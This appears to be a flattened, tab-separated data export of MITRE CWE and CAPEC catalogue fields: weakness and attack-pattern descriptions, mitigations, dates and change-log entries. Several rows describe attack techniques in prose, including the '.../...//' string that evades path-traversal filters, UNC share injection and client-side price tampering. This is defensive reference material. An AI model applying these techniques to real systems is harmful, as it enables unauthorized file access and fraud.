22002	28	CWE Content Team
15426	35	MITRE
8199	47	Read Data
19587	35	MITRE
24423	35	MITRE
7756	62	updated Potential_Mitigations
9243	62	updated Relationships
5984	39	2019-06-20
14968	26	Operation
23930	28	CWE Content Team
21617	35	MITRE
15475	26	Architecture and Design
13459	28	Sean Eidemiller
25346	62	updated Applicable_Platforms, Demonstrative_Examples
7973	35	MITRE
5934	100	The MITRE Corporation
23295	62	updated References, Relationships, Taxonomy_Mappings
8300	91	Implementation
23638	62	updated Other_Notes
18932	28	CWE Content Team
18406	56	ChildOf
20873	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8193	62	updated Relationships
6155	62	updated References, Relationships
13029	63	Read Files or Directories
17096	97	OS Command Injection
18665	53	The MITRE Corporation
18919	35	MITRE
5714	91	Implementation
23055	74	1
17966	101	CAPEC Content Team
10696	27	A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).                On average, for a binary key of size N, 2^(N/2) trials will be needed to find the key that would decrypt the ciphertext to obtain the original plaintext.                Obviously as N gets large the brute force approach becomes infeasible.
12287	42	Assume all input is malicious. Use a standard input validation mechanism to validate all input for length, type, syntax, and business rules before accepting the data. Use an "accept known good" validation strategy.
16257	43	Simple
12468	39	2008-08-01
10720	35	MITRE
21935	28	CWE Content Team
23712	35	MITRE
19585	104	1041
20040	23	A's behavior or functionality changes with a new version of A, or a new environment, which is not known (or manageable) by B.
11922	42	Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.
9343	39	2017-11-08
23737	51	2015-11-09
12505	39	2010-09-27
10650	28	CWE Content Team
11353	31	1000
24595	39	2011-03-29
11038	95	[Identify web application URL inputs] Review application inputs to find those that are designed to be URLs.
23934	23	An adversary exploits a weakness in access control to disable security tools so that detection does not occur. This can take the form of killing processes, deleting registry keys so that tools do not start at run time, deleting log files, or other methods.
20738	90	Language-Independent
21129	46	When a program calls free() twice with the same argument, the program's memory management data structures become corrupted. This corruption can cause the program to crash or, in some circumstances, cause two later calls to malloc() to return the same pointer. If malloc() returns the same value twice and the program later gives the attacker control over the data that is written into this doubly-allocated memory, the program becomes vulnerable to a buffer overflow attack.
24077	31	1000
21126	23	The software allows user input to control or influence paths or file names that are used in filesystem operations.
15535	103	Primary
25244	32	The Web Application Security Consortium (WASC)
19214	59	Updated Related_Attack_Patterns
16697	61	Stable
22795	81	Access Control
10776	35	MITRE
24838	35	MITRE
6428	79	Authentication
15681	90	Language-Independent
13481	35	MITRE
7990	74	4
11348	40	The attacker can create symbolic link on the target host.
16561	90	Language-Independent
7875	77	Dynamic Analysis with Automated Results Interpretation
15155	45	Variant
6697	88	Assignment of a Fixed Address to a Pointer
18430	39	2013-02-21
7207	62	updated Demonstrative_Examples
8819	23	The application can be deployed with active debugging code that can create unintended entry points.
23386	55	CAPEC Content Team
24719	39	2011-06-01
14672	50	Implementation: Customizing HTTP error codes such as 404 or 500.
16578	62	updated Taxonomy_Mappings
24062	28	CWE Content Team
15131	56	ChildOf
24651	60	25
17329	90	Language-Independent
22495	88	Incorrect Synchronization
12965	28	Eric Dalci
7200	39	2017-01-19
18746	91	Architecture and Design
22349	59	Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses
21774	35	MITRE
11145	90	JavaScript
19647	49	2016
12673	63	Modify Application Data
14722	39	2014-07-30
24276	91	Implementation
14508	45	Base
10630	39	2012-05-11
21706	56	ChildOf
13935	62	updated Relationships
7142	60	25
19522	33	Rafal Los
17608	62	updated Relationships, Other_Notes, Relationship_Notes, Relevant_Properties, Taxonomy_Mappings, Weakness_Ordinalities
7888	62	updated Demonstrative_Examples
24392	23	The adversary targets a race condition occurring when multiple processes access and manipulate the same resource concurrently, and the outcome of the execution depends on the particular order in which the access takes place. The adversary can leverage a race condition by "running the race", modifying the resource and modifying the normal execution flow. For instance, a race condition can occur while accessing a file: the adversary can trick the system by replacing the original file with his version and cause the system to read the malicious file.
9552	104	620
15045	40	The adversary needs physical access to the victim system.
9682	43	Simple
8268	62	updated Maintenance_Notes
18275	35	MITRE
23738	69	Draft
15708	100	The MITRE Corporation
10916	28	CWE Content Team
15807	62	updated Relationships
23813	35	MITRE
24763	39	2012-10-30
14357	100	The MITRE Corporation
9218	28	CWE Content Team
7602	35	MITRE
20928	35	MITRE
10579	66	Detection and Prediction of Resource-Exhaustion Vulnerabilities
10854	35	MITRE
11240	62	updated Relationships
14799	28	CWE Content Team
20685	39	2017-11-08
15269	95	If any particular client's information is available through the transport means simply by selecting a particular identifier, an attacker can simply provide that particular identifier.
14037	39	2017-11-08
24200	62	updated Description
11642	88	Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element
6656	60	19
15625	62	updated Relationships, Taxonomy_Mappings
6185	39	2011-06-01
16194	91	Implementation
19633	42	Refuse to reuse nonce values.
17953	56	ChildOf
15387	28	CWE Content Team
14603	69	Incomplete
19918	76	2018-07-31
5581	35	Cigital
7765	62	updated Demonstrative_Examples, Related_Attack_Patterns
15794	35	Cigital
14297	55	CAPEC Content Team
17207	35	MITRE
17298	92	Exploit
17200	62	updated Relationships, Taxonomy_Mappings
20420	91	Architecture and Design
16874	28	CWE Content Team
24066	23	The program violates the Enterprise JavaBeans (EJB) specification by using the java.io package.
8566	23	A function can return a pointer to memory that is outside of the buffer that the pointer is expected to reference.
22062	28	CWE Content Team
7382	76	2015-11-09
8001	103	Primary
17096	61	Draft
22891	35	MITRE
10603	88	ASP.NET Misconfiguration: Password in Configuration File
13108	56	ChildOf
16108	100	The MITRE Corporation
18429	104	693
16703	25	Low
13241	39	2017-11-08
14742	28	CWE Content Team
16327	23	The software uses obfuscation or encryption of inputs that should not be mutable by an external actor, but the software does not use integrity checks to detect if those inputs have been modified.
18261	35	MITRE
25428	28	Sean Eidemiller
23801	96	2009-07-16
8532	35	Cigital
18713	105	Mobile
25420	21	PLOVER
24553	81	Confidentiality
25317	76	2018-07-31
10765	79	Access Control
5714	42	Check your search path before use and remove any elements that are likely to be unsafe, such as the current working directory or a temporary files directory. Since this is a blacklist approach, it might not be a complete solution.
18124	85	391
9534	53	The MITRE Corporation
12445	81	Integrity
20587	102	ChildOf
20904	31	1000
18411	35	Cigital
24865	76	2018-07-31
16968	28	CWE Content Team
20990	74	2
10201	69	Draft
18096	88	Parent Class with a Virtual Destructor and a Child Class without a Virtual Destructor
8472	47	Read Data
22850	28	KDM Analytics
20013	104	776
20947	35	MITRE
14449	35	Veracode
9983	35	MITRE
22674	39	2008-09-08
24401	33	Tim Rains
22755	28	CWE Content Team
15121	69	Draft
23507	103	Primary
11424	39	2014-07-30
19561	21	PLOVER
16174	56	ChildOf
23635	91	Architecture and Design
21129	104	415
24439	62	updated Time_of_Introduction
18615	28	CWE Content Team
9052	39	2019-01-03
20748	60	11
22316	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             The '.../...//' manipulation is useful for bypassing some path traversal protection schemes. If "../" is filtered in a sequential fashion, as done by some regular expression engines, then ".../...//" can collapse into the "../" unsafe value (CWE-182). Removing the first "../" yields "....//"; the second removal yields "../". Depending on the algorithm, the software could be susceptible to CWE-34 but not CWE-35, or vice versa.
14357	59	Updated Typical_Likelihood_of_Exploit
24411	35	MITRE
13923	71	2011
11778	59	Updated Taxonomy_Mappings
21644	51	2014-06-23
23049	42	Always set the secure attribute when the cookie should sent via HTTPS only.
23861	39	2014-07-30
8196	62	updated Relationships, Taxonomy_Mappings
19929	21	Anonymous Tool Vendor (under NDA)
8132	25	Medium
12694	59	Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations
20876	72	This weakness can cause unintended behavior and can lead to additional weaknesses such as allowing an attacker to gain unintended access to system resources.
12518	62	updated Relationships
20522	62	updated Time_of_Introduction
15801	39	2012-10-30
24892	35	MITRE
11573	97	Flash Memory Attacks
23898	28	CWE Content Team
19537	100	The MITRE Corporation
10693	42	Be especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow.
18913	100	The MITRE Corporation
11975	100	The MITRE Corporation
21346	35	Cigital
19460	103	Primary
10479	35	MITRE
22665	44	SOAR Partial
24125	39	2008-07-01
14683	63	Other
21500	56	ChildOf
15276	47	Resource Consumption
6322	23	The software defines a public method that reads or modifies a private variable.
21345	47	Unreliable Execution
13375	101	CAPEC Content Team
10546	102	ChildOf
17652	33	Gary McGraw
8991	46	Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Attackers can bypass protection mechanisms such as authorization and authentication by modifying the cookie to contain an expected value.
19653	103	Primary
13419	62	updated Relationships, Taxonomy_Mappings
5893	28	CWE Content Team
22478	42	Identify all alternate channels and use the same protection mechanisms that are used for the primary channels.
16696	28	CWE Content Team
25309	97	Data Interchange Protocol Manipulation
5760	28	CWE Content Team
10470	35	MITRE
24137	31	1000
23294	28	CWE Content Team
23140	59	Updated Attack_Phases
14402	39	2014-06-23
20554	39	2010-06-21
21141	63	Read Files or Directories
18586	28	CWE Content Team
23001	91	Architecture and Design
9232	28	CWE Content Team
21774	39	2014-07-30
17007	56	ChildOf
9516	35	MITRE
13360	76	2018-07-31
21692	85	587
23445	39	2008-11-24
24021	39	2017-11-08
12961	47	Gain Privileges
17201	63	Unexpected State
20006	28	CWE Content Team
6185	28	CWE Content Team
18859	23	Covert timing channels convey information by modulating some aspect of system behavior over time, so that the program receiving the information can observe system behavior and infer protected information.
22802	53	The MITRE Corporation
13105	62	updated Potential_Mitigations
21353	62	updated Potential_Mitigations, Time_of_Introduction
12791	35	MITRE
14175	54	High
6206	62	updated Relationships, Taxonomy_Mappings
13019	62	updated Relationships
17310	26	Implementation
11705	35	MITRE
9116	58	In order to use the Struts Validator, a form must extend one of the following: ValidatorForm, ValidatorActionForm, DynaValidatorActionForm, and DynaValidatorForm. You must extend one of these classes because the Struts Validator ties in to your application by implementing the validate() method in these classes. Forms derived from the ActionForm and DynaActionForm classes cannot use the Struts Validator.
5710	39	2011-03-29
22604	81	Availability
17331	51	2014-06-23
25032	39	2017-11-08
8083	23	An adversary exploits a weakness in the server's trust of client-side processing by modifying data on the client-side, such as price information, and then submitting this data to the server, which processes the modified data. For example, eShoplifting is a data manipulation attack against an on-line merchant during a purchasing transaction. The manipulation of price, discount or quantity fields in the transaction message allows the adversary to acquire items at a lower cost than the merchant intended. The adversary performs a normal purchasing transaction but edits hidden fields within the HTML form response that store price or other information to give themselves a better deal. The merchant then uses the modified pricing information in calculating the cost of the selected items.
12147	91	Architecture and Design
16874	39	2008-09-08
10892	62	updated Relationships, Taxonomy_Mappings
8139	96	2018-07-02
21728	76	2019-04-04
16165	61	Draft
6876	78	High
6278	86	http://msdn.microsoft.com/en-us/library/ms161953.aspx
22993	42	Perform proper output validation and escaping to neutralize all code syntax from data written to code files.
12043	35	MITRE
17418	76	2015-12-07
23223	42	Web applications should not call methods that cause the virtual machine to exit, such as System.exit()
14295	35	MITRE
21009	103	Primary
6324	62	updated Common_Consequences, Demonstrative_Examples, Relationships
25140	47	Execute Unauthorized Commands
17461	35	MITRE
15282	103	Primary
21544	28	CWE Content Team
9421	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
9655	31	1000
16373	28	CWE Content Team
7386	56	ChildOf
21207	100	The MITRE Corporation
22304	35	MITRE
14045	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
5766	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
20880	35	MITRE
22476	79	Confidentiality
6467	62	updated Relationships
12263	63	Modify Files or Directories
11064	35	MITRE
24065	79	Access Control
19207	62	updated Description, Other_Notes
15513	94	If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate and exhaust available resources.
17857	28	CWE Content Team
17210	70	Advisory: Unauthorized password recovery in phpBannerExchange
22480	35	MITRE
14265	26	Architecture and Design
6045	95	[Manipulate the data in the XML database] The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to modification of application data.
15025	81	Integrity
23027	43	Simple
11715	56	ChildOf
17551	25	Medium
21601	101	CAPEC Content Team
22717	35	MITRE
19088	28	CWE Content Team
19845	35	MITRE
12206	40	The channel on which the target communicates must be vulnerable to interception (e.g., man in the middle attack).
17387	47	Hide Activities
17738	99	SANS Software Security Institute
5597	76	2015-12-07
12457	31	1000
13279	35	MITRE
17583	96	2018-07-02
8151	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
13742	39	2019-01-03
16488	39	2009-01-12
24261	30	Marcus Sachs
10219	28	CWE Content Team
10407	103	Primary
16627	35	MITRE
24439	28	Eric Dalci
16551	35	MITRE
21043	62	updated Relationships, Taxonomy_Mappings
25128	105	Mobile
11997	28	CWE Content Team
17408	42	Identify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values.
22411	39	2011-06-01
15823	79	Access Control
15692	23	The software uses OpenSSL and trusts or uses a certificate without using the SSL_get_verify_result() function to ensure that the certificate satisfies all necessary security requirements.
9748	62	updated Relationships, Taxonomy_Mappings
24033	73	Manually cover the application and record the possible places where arguments could be passed into external systems.
6452	80	An attacker may craft subtle encoding of input data by using the knowledge that he/she has gathered about the target host.
21576	39	2008-09-08
10651	28	CWE Content Team
12963	23	Debugging messages help attackers learn about the system and plan a form of attack.
12346	35	MITRE
21997	39	2012-05-11
21066	28	CWE Content Team
24046	39	2009-01-12
15338	103	Primary
18340	74	2
21117	62	updated Potential_Mitigations
6975	22	09
14365	23	An adversary may execute a flooding attack using XML messages with the intent to deny legitimate users access to a web service. These attacks are accomplished by sending a large number of XML based requests and letting the service attempt to parse each one. In many cases this type of an attack will result in a XML Denial of Service (XDoS) due to an application becoming unstable, freezing, or crashing. XDoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious XML payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. The main weakness in XDoS is that the service provider generally must inspect, parse, and validate the XML messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that XDoS targets. This attack exploits the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.
17694	73	Check error pages.
17418	101	CAPEC Content Team
5973	35	MITRE
17393	39	2011-06-01
23773	79	Confidentiality
9017	35	MITRE
25061	21	7 Pernicious Kingdoms
17549	35	MITRE
23625	39	2014-06-23
16966	56	ChildOf
22046	21	PLOVER
22233	93	Limited
15068	62	updated Common_Consequences
6782	74	2
19284	101	CAPEC Content Team
25011	76	2018-07-31
24959	90	PHP
11079	28	CWE Content Team
12317	85	608
10364	62	updated Relationships
6669	39	2010-06-21
13731	81	Integrity
19589	28	CWE Content Team
8570	39	2008-09-08
18688	73	Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.
25116	35	MITRE
16671	72	The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running "Active X" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.
8815	35	MITRE
13686	28	Eric Dalci
16527	70	SAMATE - Software Assurance Metrics And Tool Evaluation
10357	28	CWE Content Team
19123	89	Standard
22313	62	updated Common_Consequences
12947	30	Arshan Dabirsiaghi
14799	39	2010-09-27
18669	46	When a file descriptor or handle is not released after use (typically by explicitly closing it), attackers can cause a denial of service by consuming all available file descriptors/handles, or otherwise preventing other system processes from obtaining their own file descriptors/handles.
18695	39	2009-03-10
15176	62	updated Common_Consequences
7463	62	updated Relationships, Other_Notes, Taxonomy_Mappings
21735	61	Draft
19962	35	Cigital
22339	50	Be mindful of your surroundings when discussing sensitive information in public areas.
24882	23	An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the integrity of data returned or "Quoted" from the originating request that generated the error message. For this purpose "Port Unreachable" error messages are often used, as generating them requires the attacker to send a UDP datagram to a closed port on the target. When replying with an ICMP error message some IP/ICMP stack implementations change aspects of the IP header, change or reverse certain byte orders, reset certain field values to default values which differ between operating system and firmware implementations, and make other changes. Some IP/ICMP stacks are decidedly broken, indicating an idiosyncratic behavior that differs from the RFC specifications, such as the case when miscalculations affect a field value. A tremendous amount of information about the host operating system can be deduced from its 'echoing' characteristics. Notably, inspection of key protocol header fields, including the echoed header fields of the encapsulating protocol can yield a wealth of data about the host operating system or firmware version.
7365	39	2012-10-30
12587	62	updated Relationships
24201	62	updated Relationships
21154	39	2017-05-03
16346	62	updated Observed_Examples, Relationships, Taxonomy_Mappings
18289	28	CWE Content Team
5807	78	Medium
22153	76	2019-04-04
22052	35	MITRE
19375	35	Cigital
8244	39	2008-07-01
21823	91	Architecture and Design
17114	61	Draft
5773	24	MITRE
11603	89	Standard
15825	28	CWE Content Team
9352	26	Implementation
8265	31	1000
23807	63	Modify Application Data
9661	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships
14309	62	updated Abstraction, Relationships
18843	28	CWE Content Team
21539	28	CWE Content Team
7312	49	2005
20177	38	If the application does bound checking, it should fail when the data source is larger than the size of the destination buffer. If the application's code is well written, that failure should trigger an alert.
20487	62	updated Potential_Mitigations
11857	92	Exploit
19273	78	High
14571	55	CAPEC Content Team
22637	44	SOAR Partial
12148	50	Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the schema document.
9281	59	Updated Related_Attack_Patterns
11757	35	MITRE
23271	35	MITRE
14477	62	updated Relationships, Taxonomy_Mappings
5599	39	2011-03-29
9041	81	Availability
18766	79	Integrity
20370	39	2008-09-08
17019	62	updated Potential_Mitigations
8415	39	2008-07-01
21261	101	CAPEC Content Team
6790	63	Modify Application Data
6438	53	The MITRE Corporation
10843	103	Primary
8531	91	Implementation
7695	63	Read Application Data
7138	72	If an attackers can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint.
16615	53	The MITRE Corporation
10354	28	Eric Dalci
6841	35	MITRE
14246	103	Primary
19874	45	Base
18594	62	updated Relationships
19765	76	2019-04-04
10061	42	A language can be used which requires, at compile time, to catch all serious exceptions. However, one must make sure to use the most current version of the API as new exceptions could be added.
12354	63	Alter Execution Logic
18122	35	MITRE
22792	35	MITRE
19783	31	1000
17406	35	MITRE
15471	59	Updated Related_Attack_Patterns
20022	76	2018-07-31
21081	62	updated Relationships
14373	39	2008-07-01
24082	39	2008-11-24
21912	39	2009-07-27
12884	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
11847	35	MITRE
8984	76	2015-11-09
20887	46	This typically occurs when the pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used. This may result in exposure of sensitive information or possibly a crash.
14407	62	updated Demonstrative_Examples
8218	23	The software uses a resource that has not been properly initialized.
11146	28	CWE Content Team
7501	49	2016
23629	35	MITRE
12629	61	Draft
15155	88	Use After Free
12208	28	CWE Content Team
15354	103	Primary
24216	28	CWE Content Team
17457	43	Simple
5626	39	2019-01-03
11698	42	Check the results of all functions that return a value and verify that the value is non-null before acting upon it.
8946	48	03
15501	104	1059
5877	21	CWE Content Team
19758	62	updated Potential_Mitigations
23830	39	2009-10-29
15917	57	Indirect
18743	90	Language-Independent
19751	62	added/updated demonstrative examples
22272	24	MITRE
23547	91	Operation
7231	104	514
7692	59	Updated Related_Attack_Patterns, Related_Weaknesses
14724	81	Other
6324	28	CWE Content Team
23834	35	Cigital
17294	76	2017-05-01
12536	73	Select dictionary based on the application/system's supported languages.
16291	35	MITRE
11987	90	Language-Independent
18496	59	Updated Attack_Motivation-Consequences, Description Summary
6393	39	2013-07-17
22888	21	CWE Content Team
13348	28	CWE Content Team
13786	62	updated Common_Consequences
19200	62	updated Relationships
19938	56	ChildOf
17966	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity
19269	50	Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.
16049	56	ChildOf
23844	62	updated Description, Other_Notes
24811	39	2009-07-27
24980	92	Explore
12697	96	2008-09-09
7249	62	updated Modes_of_Introduction, Relationships
17782	35	MITRE
23556	28	CWE Content Team
19152	89	Meta
16668	62	updated Name
24401	48	08
23016	62	updated Demonstrative_Examples, Relationships
8476	62	updated Applicable_Platforms, Common_Consequences, Modes_of_Introduction, Name, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings
20972	102	ChildOf
16831	21	CWE Content Team
12936	40	The identity associated with the message or resource must be removable or modifiable in an undetectable way.
20830	39	2008-07-01
6870	35	MITRE
21892	63	Read Application Data
9858	28	CWE Content Team
22680	22	11
9179	90	Language-Independent
13490	55	CAPEC Content Team
7873	44	SOAR Partial
15843	62	updated Observed_Examples
24612	56	ChildOf
10022	31	1000
21996	36	http://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf
11664	63	Execute Unauthorized Code or Commands
13632	91	Architecture and Design
20411	78	High
10112	28	CWE Content Team
9333	35	MITRE
16377	88	Trapdoor
12875	35	MITRE
19673	95	[Survey application] The attacker takes an inventory of the entry points of the application.
13145	79	Availability
25046	39	2011-06-01
21238	23	An attacker is able to trick the victim into executing a Flash document that passes commands or calls to a Flash player browser plugin, allowing the attacker to exploit native Flash functionality in the client browser. This attack pattern occurs where an attacker can provide a crafted link to a Flash document (SWF file) which, when followed, will cause additional malicious instructions to be executed. The attacker does not need to serve or control the Flash document. The attack takes advantage of the fact that Flash files can reference external URLs. If variables that serve as URLs that the Flash application references can be controlled through parameters, then by creating a link that includes values for those parameters, an attacker can cause arbitrary content to be referenced and possibly executed by the targeted Flash application.
19584	59	Updated Attack_Phases
17565	90	Language-Independent
16671	81	Confidentiality
8200	42	Production applications should never use methods that generate internal details such as stack traces and error messages unless that information is directly committed to a log that is not viewable by the end user. All error message text should be HTML entity encoded before being written to the log file to protect against potential cross-site scripting attacks against the viewer of the logs
11209	92	Explore
21361	97	Command Delimiters
11803	28	CWE Content Team
24205	28	CWE Content Team
18398	28	CWE Content Team
12766	102	ChildOf
7469	63	DoS: Crash, Exit, or Restart
12420	76	2018-07-31
6397	35	Veracode
12054	36	http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
8296	59	Updated Resources_Required
15080	35	MITRE
10716	28	CWE Content Team
16515	62	updated Relationships
7004	35	MITRE
6471	40	The targeted client software has a buffer overflow vulnerability.
6609	23	The software uses a primary channel for administration or restricted functionality, but it does not properly protect the channel.
24540	62	updated Relationships, Taxonomy_Mappings
22014	40	Ability to forge web communications to deliver modified design documentation.
16119	28	CWE Content Team
7720	62	updated Common_Consequences
20274	35	MITRE
22236	35	MITRE
19694	51	2014-06-23
25253	63	Read Memory
20382	28	CWE Content Team
18183	62	updated Applicable_Platforms
14331	35	MITRE
11973	91	System Configuration
19665	43	Simple
22742	28	CWE Content Team
14939	76	2017-08-04
22854	39	2013-02-21
21127	63	Read Memory
17837	39	2008-11-24
6156	62	updated Relationships, Taxonomy_Mappings
10112	62	updated Common_Consequences
23658	91	Implementation
22109	39	2012-05-11
20350	81	Availability
11160	23	An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software system to potentially redirect access to an unintended location or arbitrary file.
9527	39	2010-02-16
22653	28	CWE Content Team
9593	35	MITRE
11240	35	MITRE
5872	39	2012-10-30
12800	25	High
5681	61	Draft
16405	62	updated Observed_Examples
24476	51	2014-06-23
8713	76	2017-05-01
23682	45	Base
11978	63	Varies by Context
10048	32	SecureNet GmbH
7155	51	2014-06-23
12197	39	2009-10-29
23096	39	2009-12-28
25208	77	Manual Static Analysis
24095	39	2012-10-30
19155	92	Experiment
24875	28	CWE Content Team
25100	91	Implementation
14774	21	PLOVER
10449	51	2015-11-09
15313	62	updated Time_of_Introduction
15076	31	1000
24399	85	195
8443	73	Try multiple exploit techniques to list directory contents for directories that will not reveal their contents with a "/" request
13126	47	Resource Consumption
8683	28	Eric Dalci
15463	28	Eric Dalci
9458	28	CWE Content Team
5933	53	The MITRE Corporation
13607	26	Implementation
20315	62	updated Potential_Mitigations
7984	28	CWE Content Team
19603	28	Eric Dalci
10199	21	Evgeny Lebanidze
14195	24	MITRE
18658	35	MITRE
9578	39	2008-07-01
5988	39	2008-07-01
10317	79	Access Control
20852	31	699
8088	103	Primary
19464	27	For some APIs, the attacker will need that appropriate client application that interfaces with the API. Other APIs can be executed using simple tools, such as web browsers or console windows. In some cases, an attacker may need to be able to authenticate to the target before it can access the vulnerable APIs.
24765	35	MITRE
18899	101	CAPEC Content Team
24327	31	1000
13109	49	2010
23345	100	The MITRE Corporation
11868	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
9799	62	updated Potential_Mitigations
8768	28	CWE Content Team
19072	101	CAPEC Content Team
10656	35	MITRE
20740	39	2014-07-30
24133	88	Missing Support for Integrity Check
5761	62	updated Relationships
13784	39	2014-07-30
17913	101	CAPEC Content Team
21995	39	2012-05-11
20700	45	Variant
24420	39	2012-05-11
18903	39	2009-07-27
19996	35	MITRE
7479	72	Attackers can modify or delete sensitive information by accessing the unrestricted storage mechanism.
15531	67	High
21955	62	updated Other_Notes
13400	59	Updated Related_Attack_Patterns
15892	91	Architecture and Design
15237	81	Availability
14310	45	Base
22961	62	updated Common_Consequences
19725	60	22
5729	39	2017-05-03
19273	27	The attacker must have access to a client and be able to modify the client behavior, often through reverse engineering. If the server is assuming specific client functionality, this usually means the server only recognizes a specific client application, rather than a broad class of client applications. Reverse engineering tools would likely be necessary.
24956	100	The MITRE Corporation
13323	61	Draft
8235	77	Architecture or Design Review
21463	62	updated Demonstrative_Examples
20177	50	Use a language or compiler that performs automatic bounds checking
20323	69	Draft
16345	39	2011-06-01
18410	59	Updated References
8827	72	Other applications, possibly untrusted, can bind to the Service.
19907	28	CWE Content Team
12551	45	Base
12235	62	updated Relationships
13391	28	CWE Content Team
18866	81	Other
19807	71	2010
13998	69	Draft
12500	47	Read Data
16258	100	The MITRE Corporation
20739	104	483
17855	59	Updated References, Related_Weaknesses
21440	32	The Wikimedia Foundation, Inc
24756	28	CWE Content Team
11298	43	Simple
9467	26	Architecture and Design
15629	51	2014-06-23
18846	24	MITRE
19833	28	CWE Content Team
12908	28	CWE Content Team
7101	40	The targeted application must use session credentials to identify legitimate users.
21480	39	2017-11-08
22990	23	In this attack pattern, an adversary influences a target's web-hosting company to disables a target domain. The goal is to prevent access to the targeted service provided by that domain. It usually occurs as the result of civil or criminal legal interventions.
14298	62	updated Relationships, Taxonomy_Mappings
16219	53	The MITRE Corporation
16204	28	CWE Content Team
11015	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
18742	103	Primary
20455	62	updated Demonstrative_Examples, Potential_Mitigations
10566	101	CAPEC Content Team
